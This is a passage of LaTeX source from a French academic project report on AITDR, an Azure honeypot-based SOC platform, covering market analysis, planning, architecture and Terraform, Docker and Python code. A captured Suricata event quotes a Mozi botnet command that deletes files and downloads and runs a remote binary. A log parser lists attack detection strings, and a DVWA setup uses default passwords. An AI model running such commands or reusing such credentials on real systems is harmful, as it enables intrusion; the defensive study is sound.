Faisabilité budgétaire & $<$ 100 USD & 87,40 USD estimé & GO \\ \hline
Adéquation marché & Intérêt $>$ 70\% & 85\% & GO \\ \hline
\end{tabularx}
\end{table}

\section{Cadrage du projet (Project Charter)}
\begin{table}[H]
\centering
\caption{Project Charter complet}
\label{tab:charter}
\small
\begin{tabularx}{\textwidth}{|L{3.4cm}|Y|}
\hline
\theadcell{Dimension} & \theadcell{Description} \\
\hline
Intitulé & AITDR - Azure Intelligent Threat Detection \& Response \\ \hline
Équipe & Oussama Gammal, développeur unique. \\ \hline
Encadrants & [Nom du superviseur] \\ \hline
Date de démarrage & Octobre 2025 \\ \hline
Date de livraison & 16 juin 2026 \\ \hline
Objectif général & Concevoir et déployer une plateforme SOC cloud-native sur Azure. \\ \hline
Objectifs spécifiques & Infrastructure, honeypot, ETL, SIEM, SOAR, ML, Power BI, budget. \\ \hline
Périmètre inclus & Azure, Terraform, DVWA, Sentinel, Logic Apps, ML, Power BI. \\ \hline
Périmètre exclu & Forensique approfondie, multi-cloud, pentest offensif. \\ \hline
Parties prenantes & Encadrant, EMSI, professionnels interrogés, communautés open source. \\ \hline
Budget & 100 USD. \\ \hline
Contraintes & Budget strict, délai académique, dépendance Azure. \\ \hline
Indicateurs de succès & Déploiement rapide, détection $<$ 5 minutes, réponse $<$ 30 secondes. \\ \hline
\end{tabularx}
\end{table}

\section{Conclusion du Chapitre 1}
Ce chapitre a établi le contexte, la problématique et l'opportunité du projet AITDR. Il a montré que les organisations marocaines font face à des cybermenaces croissantes avec des moyens limités. Les frustrations des utilisateurs, l'analyse des causes et la validation terrain confirment la pertinence d'une solution SOC cloud-native accessible. Le Project Charter formalise le périmètre, les objectifs et les indicateurs de réussite du projet.

% ============================================
% CHAPITRE 2
% ============================================
\chapter{Analyse Stratégique \& Étude de Marché}

\section{Délimitation et analyse du marché cible}
\subsection{Définition du marché et périmètre géographique}
Le marché primaire d'AITDR est celui de la cybersécurité Cloud au Maroc. Le TAM est estimé entre 8 000 et 12 000 entreprises de plus de 10 salariés. Le SAM concerne environ 3 000 entreprises localisées principalement dans la région Casablanca-Settat.

\subsection{Chiffres clés du marché de la cybersécurité au Maroc}
\begin{table}[H]
\centering
\caption{Chiffres clés de la cybersécurité au Maroc}
\label{tab:marche}
\small
\begin{tabularx}{\textwidth}{|Y|L{3cm}|Y|}
\hline
\theadcell{Indicateur} & \theadcell{Valeur} & \theadcell{Source} \\
\hline
Taille du marché cybersécurité & 1,2 Mrd MAD & ANRT \\ \hline
CAGR & 18\% & Gartner \\ \hline
Taille projetée & 2,7 Mrd MAD & Projection \\ \hline
Entreprises Cloud & 4 500 & ANRT \\ \hline
Taux de pénétration SIEM & 10\% & Enquête terrain \\ \hline
\end{tabularx}
\end{table}

\section{Analyse macro-environnementale : PESTEL}
\placeholderfigure{2.1}{Analyse PESTEL de AITDR}
\begin{table}[H]
\centering
\caption{Analyse PESTEL détaillée}
\label{tab:pestel}
\small
\begin{tabularx}{\textwidth}{|L{2.6cm}|L{2cm}|Y|}
\hline
\theadcell{Dimension} & \theadcell{Impact} & \theadcell{Analyse détaillée} \\
\hline
Politique & Élevé & Maroc Digital 2030 encourage la transformation numérique et la sécurité des infrastructures. \\ \hline
Économique & Élevé & Les cyberattaques ont un coût élevé et les PME ont besoin de solutions abordables. \\ \hline
Social & Élevé & La sensibilisation augmente mais la pénurie de talents cyber demeure forte. \\ \hline
Technologique & Très élevé & Azure, Sentinel, Logic Apps, Terraform et ML permettent une solution moderne. \\ \hline
Environnemental & Faible & L'optimisation cloud limite la consommation inutile des ressources. \\ \hline
Légal & Élevé & La CNDP, la loi 09-08 et les exigences RGPD renforcent le besoin de traçabilité. \\ \hline
\end{tabularx}
\end{table}

\section{Analyse concurrentielle}
\begin{table}[H]
\centering
\caption{Benchmark concurrentiel}
\label{tab:benchmark}
\scriptsize
\begin{tabularx}{\textwidth}{|L{2.3cm}|L{2cm}|L{2.2cm}|L{2.2cm}|Y|Y|}
\hline
\theadcell{Concurrent} & \theadcell{Type} & \theadcell{Présence Maroc} & \theadcell{Prix mensuel} & \theadcell{Avantages} & \theadcell{Faiblesses vs AITDR} \\
\hline
Microsoft Sentinel & Cloud SIEM & Forte & 20 000+ MAD & Intégration Azure. & Coût et complexité. \\ \hline
Splunk & SIEM commercial & Partenaires & 80 000+ MAD & Leader historique. & Coût prohibitif. \\ \hline
Elastic & Open source / Cloud & Communauté & 0 à 15 000+ MAD & Flexibilité. & Expertise requise. \\ \hline
AITDR & Cloud Azure & Nouvel entrant & 1 200--5 000 MAD & Intégré, économique, reproductible. & Notoriété à construire. \\ \hline
\end{tabularx}
\end{table}

\section{Analyse SWOT de AITDR}
\begin{table}[H]
\centering
\caption{Matrice SWOT}
\label{tab:swot}
\small
\begin{tabularx}{\textwidth}{|Y|Y|}
\hline
\theadcell{FORCES} & \theadcell{FAIBLESSES} \\
\hline
\begin{itemize}
\item Architecture Azure native.
\item Déploiement Terraform.
\item Intégration SIEM/SOAR/ML/Power BI.
\item Coût maîtrisé.
\item Automatisation de la réponse.
\end{itemize}
&
\begin{itemize}
\item Dépendance Azure.
\item Notoriété faible.
\item Développeur unique.
\item Certifications absentes au départ.
\end{itemize}
\\ \hline
\theadcell{OPPORTUNITÉS} & \theadcell{MENACES} \\
\hline
\begin{itemize}
\item Croissance du cloud.
\item Besoin PME.
\item Pénurie de talents.
\item Adoption de l'IA cyber.
\end{itemize}
&
\begin{itemize}
\item Concurrence des éditeurs.
\item Évolution rapide des menaces.
\item Coûts Azure variables.
\item Exigences légales.
\end{itemize}
\\ \hline
\end{tabularx}
\end{table}

\section{Proposition de valeur différenciée}
\begin{table}[H]
\centering
\caption{Proposition de valeur différenciée}
\label{tab:value}
\small
\begin{tabularx}{\textwidth}{|L{3cm}|Y|Y|}
\hline
\theadcell{Différenciateur} & \theadcell{Description} & \theadcell{Valeur apportée} \\
\hline
Coût maîtrisé & Usage Azure PAYG optimisé. & Accessibilité pour PME. \\ \hline
Reproductibilité & Déploiement Terraform. & Moins d'erreurs et standardisation. \\ \hline
SOAR & Logic Apps automatise la réponse. & Réduction du MTTC. \\ \hline
ML & Isolation Forest et DBSCAN. & Détection d'anomalies inconnues. \\ \hline
Verticalité & Capture, SIEM, SOAR, ML, visualisation. & Solution complète. \\ \hline
\end{tabularx}
\end{table}

\section{Conclusion du Chapitre 2}
Ce chapitre a montré que le marché marocain de la cybersécurité cloud est favorable à AITDR. L'analyse PESTEL révèle des facteurs porteurs, notamment la digitalisation, la croissance du cloud et la pénurie de talents cyber. Le benchmark concurrentiel confirme l'existence d'un espace pour une solution plus accessible. La SWOT met en évidence des forces techniques importantes et des risques à surveiller. La proposition de valeur positionne AITDR comme une alternative intégrée et économique.

% ============================================
% CHAPITRE 3
% ============================================
\chapter{Viabilité Entrepreneuriale \& Modèle d'Affaires}
\section{Business Model Canvas de AITDR}
\AITDRBusinessModelCanvas

\section{Étude de faisabilité technique}
\subsection{Ressources matérielles et logicielles}
\begin{table}[H]
\centering
\caption{Ressources matérielles et logicielles}
\label{tab:ressources}
\small
\begin{tabularx}{\textwidth}{|L{3.3cm}|Y|L{2.5cm}|Y|}
\hline
\theadcell{Ressource} & \theadcell{Détail} & \theadcell{Coût estimé} & \theadcell{Justification} \\
\hline
Azure & VMs, Sentinel, SQL, Logic Apps. & 100 USD max & Crédits étudiants. \\ \hline
Terraform & IaC. & 0 USD & Open source. \\ \hline
Suricata & IDS/IPS. & 0 USD & Open source. \\ \hline
Python & ETL et ML. & 0 USD & Open source. \\ \hline
Power BI & Visualisation. & 0 USD & Desktop gratuit. \\ \hline
GitHub & Versioning. & 0 USD & Dépôt projet. \\ \hline
\end{tabularx}
\end{table}

\subsection{Ressources humaines et coût de développement}
\begin{table}[H]
\centering
\caption{Coût de développement}
\label{tab:coutdev}
\small
\begin{tabularx}{\textwidth}{|L{3cm}|Y|C{1.5cm}|L{2cm}|R{2.5cm}|}
\hline
\theadcell{Profil/Poste} & \theadcell{Rôle} & \theadcell{Nb} & \theadcell{Durée} & \theadcell{Coût estimé} \\
\hline
Chef de projet & Planification et reporting. & 1 & PFA & 3 000 MAD \\ \hline
Cloud Architect & Architecture Azure et Terraform. & 1 & PFA & 2 500 MAD \\ \hline
Développeur SIEM/SOAR & Sentinel, KQL, Logic Apps. & 1 & PFA & 2 000 MAD \\ \hline
Data Scientist & ML et analyse. & 1 & PFA & 1 500 MAD \\ \hline
Total & Conditions PFA. & -- & -- & 9 000 MAD \\ \hline
\end{tabularx}
\end{table}

\section{Étude de faisabilité commerciale}
\subsection{Modèle de tarification}
\begin{table}[H]
\centering
\caption{Grille tarifaire}
\label{tab:tarifs}
\small
\begin{tabularx}{\textwidth}{|L{2.3cm}|L{2.3cm}|Y|Y|}
\hline
\theadcell{Offre} & \theadcell{Prix} & \theadcell{Fonctionnalités} & \theadcell{Cible} \\
\hline
Discovery & Gratuit & Open source auto-hébergé. & Étudiants, chercheurs. \\ \hline
Basic & 49 USD/mois & Honeypot, Sentinel, KQL. & Startups. \\ \hline
Premium & 99 USD/mois & Basic + SOAR + ML + Power BI. & PME. \\ \hline
Enterprise & Sur devis & Infrastructure dédiée et support. & Grands comptes, MSSP. \\ \hline
\end{tabularx}
\end{table}

\subsection{Projection du chiffre d'affaires --- Année 1}
\begin{table}[H]
\centering
\caption{Projection du chiffre d'affaires}
\label{tab:ca}
\small
\begin{tabularx}{\textwidth}{|L{1.5cm}|Y|R{2.1cm}|R{2.1cm}|R{2.2cm}|}
\hline
\theadcell{Période} & \theadcell{Levier d'acquisition} & \theadcell{Clients Discovery} & \theadcell{Clients Payants} & \theadcell{CA mensuel} \\
\hline
M1 & Lancement GitHub. & 50 & 0 & 0 USD \\ \hline
M2 & LinkedIn et bouche-à-oreille. & 80 & 2 & 148 USD \\ \hline
M3 & Blog et webinaires. & 120 & 5 & 395 USD \\ \hline
M4 & Partenariats écoles. & 180 & 8 & 692 USD \\ \hline
M5 & Azure Marketplace. & 250 & 15 & 1 335 USD \\ \hline
M6 & Campagne marketing. & 350 & 25 & 2 275 USD \\ \hline
\end{tabularx}
\end{table}

\section{Étude de faisabilité financière}
\subsection{Structure des coûts opérationnels}
\begin{table}[H]
\centering
\caption{Structure des coûts opérationnels}
\label{tab:coutops}
\small
\begin{tabularx}{\textwidth}{|Y|L{2cm}|R{3cm}|Y|}
\hline
\theadcell{Poste de coût} & \theadcell{Type} & \theadcell{Montant mensuel} & \theadcell{Base de calcul} \\
\hline
Infrastructure Azure & Variable & 44 USD/client & VMs, SQL, Sentinel. \\ \hline
Support technique & Fixe & 100 USD & Support partiel. \\ \hline
Maintenance & Fixe & 80 USD & Correctifs et règles. \\ \hline
Marketing & Fixe & 70 USD & Contenu et acquisition. \\ \hline
Documentation & Fixe & 20 USD & Hébergement et rédaction. \\ \hline
\end{tabularx}
\end{table}

\subsection{Calcul du seuil de rentabilité}
\begin{table}[H]
\centering
\caption{Calcul du seuil de rentabilité}
\label{tab:sr}
\small
\begin{tabularx}{\textwidth}{|L{4cm}|L{3cm}|Y|}
\hline
\theadcell{Paramètre} & \theadcell{Valeur} & \theadcell{Détail} \\
\hline
RMA & 888 USD & 74 USD/mois moyen $\times$ 12. \\ \hline
CF & 3 240 USD & Charges fixes annuelles. \\ \hline
CVu & 528 USD & Coût infra annuel par client. \\ \hline
MCVu & 360 USD & RMA - CVu. \\ \hline
SR & 9 clients & CF / MCVu. \\ \hline
CA SR & 7 992 USD & SR $\times$ RMA. \\ \hline
Interprétation & Rentable dès 9 clients & Seuil réaliste pour un MVP. \\ \hline
\end{tabularx}
\end{table}

\subsection{Projections financières sur deux semestres}
\begin{table}[H]
\centering
\caption{Projections financières}
\label{tab:projections}
\small
\begin{tabularx}{\textwidth}{|Y|R{3cm}|R{3cm}|}
\hline
\theadcell{Indicateur} & \theadcell{S1} & \theadcell{S2} \\
\hline
Clients payants & 25 & 50 \\ \hline
CA semestriel & 4 845 USD & 10 000 USD \\ \hline
Charges fixes & 1 620 USD & 1 800 USD \\ \hline
Charges variables & 2 640 USD & 5 280 USD \\ \hline
Résultat & 585 USD & 2 920 USD \\ \hline
Marge nette & 12\% & 29\% \\ \hline
\end{tabularx}
\end{table}

\section{Stratégie marketing et plan de lancement}
La stratégie marketing repose sur une approche progressive : publication du prototype open source, diffusion de contenus techniques, démonstrations auprès d'écoles d'ingénieurs, communication LinkedIn, webinaires et inscription sur Azure Marketplace. Le lancement vise d'abord les étudiants, chercheurs et petites structures, puis les PME et MSSP intéressés par un SOC accessible.

\section{Scalabilité et roadmap produit}
\begin{table}[H]
\centering
\caption{Roadmap produit}
\label{tab:roadmap}
\small
\begin{tabularx}{\textwidth}{|L{2cm}|L{3cm}|Y|}
\hline
\theadcell{Horizon} & \theadcell{Période} & \theadcell{Objectifs et fonctionnalités/actions clés} \\
\hline
H1 & Mois 1-3 & MVP : Terraform, DVWA, ETL, Sentinel et règles KQL. \\ \hline
H2 & Mois 4-6 & SOAR, ML, Power BI, documentation et marketplace. \\ \hline
H3 & Mois 7-12 & Threat Intelligence, Sigma, Zeek, multi-régions et API REST. \\ \hline
\end{tabularx}
\end{table}

\section{Conclusion du Chapitre 3}
Ce chapitre a démontré la viabilité entrepreneuriale d'AITDR. Le BMC structure clairement le modèle d'affaires, les ressources techniques sont accessibles et les coûts restent compatibles avec un contexte PFA. Les projections commerciales montrent un potentiel de monétisation réaliste. L'analyse financière indique un seuil de rentabilité atteignable. La roadmap propose une évolution progressive vers une solution plus scalable.

% ============================================
% CHAPITRE 4
% ============================================
\chapter{Planification \& Management de Projet}
\section{Choix de la méthodologie de développement}
\begin{table}[H]
\centering
\caption{Comparaison des méthodologies}
\label{tab:methodo}
\scriptsize
\begin{tabularx}{\textwidth}{|Y|Y|Y|Y|}
\hline
\theadcell{Critère} & \theadcell{Cycle en cascade} & \theadcell{Méthode Agile/Scrum} & \theadcell{Méthode hybride} \\
\hline
Clarté des besoins & Forte au départ. & Adaptée aux besoins évolutifs. & Moyenne. \\ \hline
Réactivité & Faible. & Très élevée. & Élevée. \\ \hline
Taille de l'équipe & Grande équipe. & Petite équipe. & Variable. \\ \hline
Livraisons & Une livraison finale. & Livraisons incrémentales. & Par jalons. \\ \hline
Gestion du risque & Risque tardif. & Risque maîtrisé progressivement. & Risque modéré. \\ \hline
Contexte académique & Adapté mais rigide. & Très adapté. & Adapté. \\ \hline
\end{tabularx}
\end{table}
Le choix retenu est Scrum, car il permet une progression incrémentale, une adaptation continue et une meilleure maîtrise des risques dans un projet réalisé par un développeur unique.

\section{Structure de l'équipe et rôles}
\begin{table}[H]
\centering
\caption{Structure de l'équipe et rôles}
\label{tab:equipe}
\small
\begin{tabularx}{\textwidth}{|L{3.5cm}|Y|}
\hline
\theadcell{Rôle} & \theadcell{Responsabilités} \\
\hline
Chef de projet & Planification, coordination, reporting, gestion des risques. \\ \hline
Cloud Architect & Architecture Azure, Terraform, VNet, NSG, Key Vault. \\ \hline
Développeur SIEM/SOAR & Microsoft Sentinel, KQL, Logic Apps, automatisation. \\ \hline
Data Scientist & Modèles ML, analyse de logs, Isolation Forest, DBSCAN. \\ \hline
\end{tabularx}
\end{table}

\section{Planning prévisionnel (Diagramme de Gantt)}
\placeholderfigure{4.1}{Diagramme de Gantt du projet AITDR}
\begin{itemize}
  \item \textbf{Phase 1 : Cadrage et conception (Octobre - Novembre 2025)} : besoin, marché, architecture.
  \item \textbf{Phase 2 : Infrastructure et collecte (Décembre 2025 - Janvier 2026)} : Terraform, DVWA, Suricata, collecte.
  \item \textbf{Phase 3 : SIEM et SOAR (Février - Mars 2026)} : Sentinel, KQL, Logic Apps.
  \item \textbf{Phase 4 : ML et Visualisation (Avril - Mai 2026)} : Isolation Forest, DBSCAN, Power BI.
  \item \textbf{Phase 5 : Tests et documentation (Juin 2026)} : validation finale, rapport et soutenance.
\end{itemize}

\section{Gestion des risques}
\begin{table}[H]
\centering
\caption{Matrice des risques}
\label{tab:risques}
\small
\begin{tabularx}{\textwidth}{|L{1cm}|Y|L{2cm}|L{2cm}|Y|}
\hline
\theadcell{ID} & \theadcell{Risque} & \theadcell{Probabilité} & \theadcell{Impact} & \theadcell{Mitigation} \\
\hline
R1 & Dépassement budget Azure. & Moyenne & Élevé & Auto-shutdown et suivi Cost Management. \\ \hline
R2 & Intégration SIEM/SOAR difficile. & Élevée & Élevé & Tests unitaires et validation progressive. \\ \hline
R3 & Données d'attaques insuffisantes. & Faible & Élevé & Déploiement précoce du honeypot. \\ \hline
R4 & Temps limité pour ML. & Élevée & Moyen & Priorisation de modèles simples. \\ \hline
\end{tabularx}
\end{table}

\section{Conclusion du Chapitre 4}
Ce chapitre a présenté l'organisation du projet, le choix méthodologique et la gestion des risques. Scrum est retenu pour sa flexibilité et son adéquation à un projet académique évolutif. Les rôles couvrent l'ensemble des compétences nécessaires. Le planning en cinq phases structure le déroulement du projet. Les risques identifiés disposent de mesures de mitigation concrètes.

% ============================================
% CHAPITRE 5
% ============================================
\chapter{Conception et modélisation de la solution proposée}
\section{Architecture globale}
L'architecture globale repose sur une topologie Hub-and-Spoke comprenant quatre zones : Hub (10.10.0.0/24) pour l'administration, VNet1 - DMZ (10.10.1.0/24) pour le honeypot exposé, VNet2 - Data (10.10.2.0/24) pour le stockage et VNet3 - SIEM/SOAR (10.10.3.0/24) pour l'analyse et l'orchestration.
\placeholderfigure{5.1}{Architecture globale AITDR --- topologie Hub-and-Spoke Azure}

\section{Topologie réseau détaillée}
\subsection{Zone Hub --- 10.10.0.0/24}
La zone Hub centralise l'administration et héberge le VPN Gateway. Elle permet l'accès sécurisé aux ressources internes et sert de point de contrôle pour les flux d'administration.
\placeholderfigure{5.2}{Vue détaillée de la zone Hub}

\subsection{Zone VNet1 --- DMZ (10.10.1.0/24)}
La zone DMZ héberge VM1, le honeypot DVWA exposé via l'IP publique 20.199.184.20. Les ports 80 et 443 sont ouverts pour attirer les attaques web, tandis que le port 22 est restreint à l'administrateur.
\placeholderfigure{5.3}{Vue détaillée de la zone DMZ}

\subsection{Zone VNet2 --- Data (10.10.2.0/24)}
La zone Data héberge Azure SQL Database et Azure Blob Storage. Elle ne possède pas d'IP publique et reçoit les données issues de la collecte et du parsing.
\placeholderfigure{5.4}{Vue détaillée de la zone Data}

\subsection{Zone VNet3 --- SIEM/SOAR (10.10.3.0/24)}
La zone SIEM/SOAR héberge Microsoft Sentinel, Azure Logic Apps et VM2 pour le Machine Learning. Elle est isolée de la DMZ afin de limiter les mouvements latéraux.
\placeholderfigure{5.5}{Vue détaillée de la zone SIEM/SOAR}

\section{Matrice des flux réseau autorisés}
\begin{table}[H]
\centering
\caption{Matrice des flux réseau autorisés}
\label{tab:flux}
\small
\begin{tabularx}{\textwidth}{|L{3cm}|L{3.2cm}|L{2cm}|Y|}
\hline
\theadcell{Source} & \theadcell{Destination} & \theadcell{Ports} & \theadcell{Justification} \\
\hline
Internet & VNet1 DMZ & 80,443 & Exposition DVWA. \\ \hline
Admin IP & VNet1 DMZ & 22 & Administration SSH. \\ \hline
VNet1 DMZ & VNet2 SQL & 1433 & Insertion des logs. \\ \hline
VNet1 DMZ & Blob Storage & 443 & Upload des rapports. \\ \hline
VNet2 Data & VNet3 ML & Interne & Lecture des données. \\ \hline
VNet3 SOAR & Azure API & 443 & Blocage NSG. \\ \hline
Hub VPN & Tous VNets & All & Administration sécurisée. \\ \hline
Deny-All & Tous & All & Blocage par défaut. \\ \hline
\end{tabularx}
\end{table}

\section{Modèle de sécurité Zero Trust}
Le modèle Zero Trust repose sur cinq couches : \textbf{Identité} avec Managed Identity, \textbf{Autorisation} par RBAC minimal, \textbf{Chiffrement} via TLS, SSH et VPN, \textbf{Segmentation} par NSG et règles Deny-All, et \textbf{Secrets} centralisés dans Azure Key Vault.

\section{Flux de données de bout en bout}
\begin{enumerate}
  \item L'attaquant contacte VM1.
  \item Suricata analyse les paquets.
  \item Apache et SSH génèrent des logs.
  \item Le timer systemd déclenche la collecte.
  \item Les logs sont copiés depuis DVWA.
  \item Les rapports sont envoyés vers Blob Storage.
  \item Les scripts Python parsèrent les logs.
  \item Les données sont insérées dans Azure SQL.
  \item Azure Monitor remonte les syslogs.
  \item Sentinel exécute les règles KQL.
  \item Les incidents déclenchent Logic Apps.
  \item Logic Apps bloque les IP malveillantes.
  \item VM2 exécute les modèles ML et Power BI visualise les résultats.
\end{enumerate}

\section{Conclusion du Chapitre 5}
Ce chapitre a présenté l'architecture et la modélisation d'AITDR. La topologie Hub-and-Spoke permet une séparation claire des zones d'administration, d'exposition, de données et d'analyse. La matrice des flux garantit le principe du moindre privilège. Le modèle Zero Trust renforce la sécurité. Le flux de bout en bout montre la cohérence entre capture, analyse, réponse et visualisation.

% ============================================
% CHAPITRE 6
% ============================================
\chapter{Réalisation de la solution AITDR}
\section{Infrastructure Cloud Azure (Terraform IaC)}
\subsection{Choix de l'Infrastructure as Code}
Terraform est retenu pour sa reproductibilité, sa lisibilité HCL et sa gestion d'état. Il permet de versionner l'infrastructure et de déployer les ressources Azure de façon contrôlée.

\subsection{Structure modulaire}
\begin{lstlisting}[style=bashstyle, caption={Arborescence complète des modules Terraform}]
soc-lab/
|-- main.tf
|-- variables.tf
|-- outputs.tf
`-- modules/
    |-- key_vault/
    |-- vm1_webserver/
    |-- vm2_ml/
    |-- sql_database/
    |-- sentinel/
    |-- soar/
    |-- nsg/
    |-- vnet1/
    |-- vnet2/
    |-- vnet3/
    `-- hub_vnet/
\end{lstlisting}
\placeholderfigure{6.1}{Structure modulaire du projet Terraform}

\subsection{Extrait du Module Key Vault}
\begin{lstlisting}[style=hclstyle, caption={Module Key Vault}]
resource "azurerm_key_vault" "aitdr_kv" {
  name                       = "aitdr-kv-${random_string.suffix.result}"
  location                   = var.location
  resource_group_name        = var.resource_group_name
  tenant_id                  = var.tenant_id
  sku_name                   = "standard"
  soft_delete_retention_days = 7
  purge_protection_enabled   = true
  enable_rbac_authorization  = true
}
\end{lstlisting}

\subsection{Extrait du Module VM1 WebServer}
\begin{lstlisting}[style=hclstyle, caption={Module VM1 WebServer}]
resource "azurerm_linux_virtual_machine" "vm1_webserver" {
  name                            = "VM1-WebServer"
  location                        = var.location
  resource_group_name             = var.resource_group_name
  size                            = "Standard_B2s"
  admin_username                  = "adminuser"
  disable_password_authentication = true

  admin_ssh_key {
    username   = "adminuser"
    public_key = var.ssh_public_key
  }

  network_interface_ids = [azurerm_network_interface.vm1_nic.id]
}
\end{lstlisting}

\subsection{Configuration NSG}
\begin{lstlisting}[style=hclstyle, caption={Configuration NSG-DMZ}]
resource "azurerm_network_security_group" "nsg_dmz" {
  name                = "NSG-DMZ"
  location            = var.location
  resource_group_name = var.resource_group_name

  security_rule {
    name                       = "Allow-HTTP"
    priority                   = 110
    direction                  = "Inbound"
    access                     = "Allow"
    protocol                   = "Tcp"
    source_port_range          = "*"
    destination_port_range     = "80"
    source_address_prefix      = "*"
    destination_address_prefix = "*"
  }

  security_rule {
    name                       = "Allow-SSH"
    priority                   = 130
    direction                  = "Inbound"
    access                     = "Allow"
    protocol                   = "Tcp"
    source_port_range          = "*"
    destination_port_range     = "22"
    source_address_prefix      = "${var.admin_ip}/32"
    destination_address_prefix = "*"
  }

  security_rule {
    name                       = "Deny-All"
    priority                   = 4096
    direction                  = "Inbound"
    access                     = "Deny"
    protocol                   = "*"
    source_port_range          = "*"
    destination_port_range     = "*"
    source_address_prefix      = "*"
    destination_address_prefix = "*"
  }
}
\end{lstlisting}
\placeholderfigure{6.2}{Configuration NSG-DMZ dans le portail Azure}

\subsection{Ordre de déploiement}
\begin{enumerate}
  \item Initialiser Terraform avec \code{terraform init}.
  \item Déployer les ressources réseau et NSG.
  \item Déployer Key Vault et SQL Database.
  \item Déployer VM1, VM2, Sentinel et Logic Apps.
  \item Exécuter \code{terraform apply} pour le déploiement global.
\end{enumerate}

\section{Honeypot et Capture des Attaques}
\subsection{Justification du choix DVWA}
DVWA est choisi car il couvre plusieurs vulnérabilités OWASP Top 10, attire naturellement les scans automatisés et se déploie facilement via Docker. Il constitue un honeypot pédagogique adapté à un environnement PFA.

\subsection{Architecture Docker}
\begin{lstlisting}[style=bashstyle, caption={docker-compose.yml complet}]
services:
  dvwa:
    image: vulnerables/web-dvwa
    ports:
      - "80:80"
    restart: always
    depends_on:
      - mysql
    networks:
      - aitdr_net

  mysql:
    image: mysql:5.7
    environment:
      MYSQL_ROOT_PASSWORD: dvwa
      MYSQL_DATABASE: dvwa
      MYSQL_USER: dvwa
      MYSQL_PASSWORD: dvwa
    restart: always
    volumes:
      - mysql_data:/var/lib/mysql
    networks:
      - aitdr_net

volumes:
  mysql_data:

networks:
  aitdr_net:
    driver: bridge
\end{lstlisting}
\placeholderfigure{6.3}{Docker Compose --- Stack DVWA}

\subsection{Cycle de vie du bootstrap}
\begin{table}[H]
\centering
\caption{Cycle de vie du bootstrap}
\label{tab:bootstrap}
\small
\begin{tabularx}{\textwidth}{|L{2.5cm}|L{4cm}|Y|}
\hline
\theadcell{Couche} & \theadcell{Mécanisme} & \theadcell{Responsabilité} \\
\hline
Layer 1 & bootstrap.sh / cloud-init & Installation packages, Docker, Suricata, durcissement SSH. \\ \hline
Layer 2 & aitdr-init.sh & Secrets Key Vault, .env, docker-compose up. \\ \hline
Layer 3 & Timers systemd & Collecte, parsing et upload périodiques. \\ \hline
\end{tabularx}
\end{table}

\subsection{Suricata IDS/IPS}
\begin{lstlisting}[style=bashstyle, caption={Configuration YAML Suricata}]
vars:
  address-groups:
    HOME_NET: "[10.0.0.0/8,172.16.0.0/12,192.168.0.0/16]"
    EXTERNAL_NET: "any"

af-packet:
  - interface: eth0
    cluster-id: 99
    cluster-type: cluster_flow
    defrag: yes
    use-mmap: yes

outputs:
  - eve-log:
      enabled: yes
      filetype: regular
      filename: /var/log/suricata/eve.json
      types:
        - alert
        - http
        - dns
        - tls
        - flow
\end{lstlisting}

\subsection{Exemple d'événement EVE JSON capturé}
\begin{lstlisting}[style=bashstyle, caption={Événement EVE JSON --- Mozi Botnet}]
{
  "timestamp": "2026-03-15T14:23:01.456789+0000",
  "event_type": "http",
  "src_ip": "67.102.7.124",
  "src_port": 54321,
  "dest_ip": "20.199.184.20",
  "dest_port": 80,
  "proto": "TCP",
  "http": {
    "hostname": "20.199.184.20",
    "url": "/setup.cgi?cmd=rm+-rf+/tmp/*;wget+http://45.95.55.31/Mozi.m+-O+/tmp/m;sh+m",
    "http_method": "GET",
    "http_user_agent": "Go-http-client/1.1",
    "status": 404,
    "length": 0
  }
}
\end{lstlisting}
\placeholderfigure{6.4}{Événement EVE JSON --- Mozi Botnet}

\section{Pipeline de Collecte et Traitement}
\subsection{Architecture du pipeline}
Le pipeline suit le pattern ETL : \textbf{Extract} pour extraire les logs Apache, SSH et Suricata, \textbf{Transform} pour normaliser et classifier les événements, et \textbf{Load} pour insérer les données dans Azure SQL Database.
\placeholderfigure{6.5}{Architecture du pipeline de collecte}

\subsection{Extrait du Script de collecte}
\begin{lstlisting}[style=bashstyle, caption={collect\_logs.sh}]
#!/bin/bash
set -euo pipefail

source /home/adminuser/.env
DAY=$(date +%Y-%m-%d)
REPORT_DIR="/home/adminuser/logs/$DAY"
mkdir -p "$REPORT_DIR"

DVWA_CONTAINER=$(docker ps --format "{{.Names}}" | grep -i dvwa | head -1 || true)
if [ -z "$DVWA_CONTAINER" ]; then
  echo "DVWA not running"
  exit 0
fi

docker cp "$DVWA_CONTAINER:/var/log/apache2/access.log" "$REPORT_DIR/apache_access.log"
cp /var/log/auth.log "$REPORT_DIR/auth.log"
cp /var/log/suricata/eve.json "$REPORT_DIR/eve.json"
python3 /home/adminuser/scripts/parse_logs.py "$REPORT_DIR"
\end{lstlisting}

\subsection{Extrait du Script parse\_logs.py}
\begin{lstlisting}[style=pythonstyle, caption={parse\_logs.py}]
#!/usr/bin/env python3
import sys
import re
import pyodbc
from datetime import datetime

ATTACK_PATTERNS = {
    "SQLi": ["UNION SELECT", "SELECT * FROM", "DROP TABLE", "' OR '1'='1"],
    "XSS": ["<script>", "alert(", "onerror=", "onload="],
    "LFI": ["../../", "etc/passwd", "/proc/self/environ"],
    "RCE": ["; wget", "; curl", "| bash", "| sh"],
    "CMDI": ["; rm", "; mkdir", "; chmod"]
}

def classify_attack(url, user_agent):
    candidate = f"{url} {user_agent}".lower()
    for attack_type, patterns in ATTACK_PATTERNS.items():
        if any(pattern.lower() in candidate for pattern in patterns):
            return attack_type
    return "Unknown"

def parse_apache_line(line):
    pattern = r'(?P<ip>\S+) .* "(?P<method>\S+) (?P<url>\S+) .*" (?P<status>\d+) .* "(?P<ua>.*)"'
    return re.search(pattern, line)
\end{lstlisting}

\subsection{Extrait du Modèle de données SQL --- DDL}
\begin{lstlisting}[style=sqlstyle, caption={DDL Azure SQL}]
CREATE TABLE SSHAttacks (
    id INT IDENTITY(1,1) PRIMARY KEY,
    attack_date DATE NOT NULL,
    attack_time DATETIME NOT NULL,
    attacker_ip VARCHAR(45) NOT NULL,
    username_tried VARCHAR(100),
    attack_result VARCHAR(20)
);

CREATE TABLE WebAttacks (
    id INT IDENTITY(1,1) PRIMARY KEY,
    attack_date DATE NOT NULL,
    attack_time DATETIME NOT NULL DEFAULT GETDATE(),
    attacker_ip VARCHAR(45) NOT NULL,
    attack_type VARCHAR(50) NOT NULL,
    url_path VARCHAR(500),
    http_method VARCHAR(10),
    status_code INT,
    user_agent VARCHAR(500)
);

CREATE TABLE PacketLogs (
    id INT IDENTITY(1,1) PRIMARY KEY,
    timestamp DATETIME NOT NULL,
    src_ip VARCHAR(45),
    dest_ip VARCHAR(45),
    src_port INT,
    dest_port INT,
    protocol VARCHAR(10),
    alert_signature VARCHAR(500),
